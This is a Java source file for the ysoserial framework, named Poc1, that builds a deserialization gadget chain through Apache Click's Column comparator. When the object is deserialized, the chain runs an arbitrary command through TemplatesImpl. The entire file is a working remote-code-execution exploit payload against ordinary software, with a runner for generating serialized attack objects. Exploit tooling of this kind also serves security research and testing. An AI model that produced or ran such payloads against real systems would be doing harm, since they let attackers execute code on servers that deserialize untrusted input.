package ysoserial.payloads.tabbyGadgetChains.Click;

import org.apache.click.control.Column;
import org.apache.click.control.Table;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * gadget chain
 * java.util.PriorityQueue.readObject()
 * java.util.PriorityQueue.heapify()
 * java.util.PriorityQueue.siftDown()
 * java.util.PriorityQueue.siftDownUsingComparator()
 * org.apache.click.control.Column$ColumnComparator.compare()
 * org.apache.click.control.Column.getProperty()
 * org.apache.click.control.Column.getProperty()
 * org.apache.click.util.PropertyUtils.getValue()
 * org.apache.click.util.PropertyUtils.getObjectPropertyValue()
 * java.lang.reflect.Method.invoke()
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 * ...
 */



public class Poc1 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        // prepare a Column.comparator with mock values
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);

        // create queue with numbers and our comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by the comparator,
        // so it will trigger getOutputProperties() when objects in the queue are compared
        column.setName("outputProperties");

        // finally, we inject and new TemplatesImpl object into the queue,
        // so its getOutputProperties() method will be called
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        final Object templates = Gadgets.createTemplatesImpl(command);
        queueArray[0] = templates;

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Poc1.class, args);
    }
}
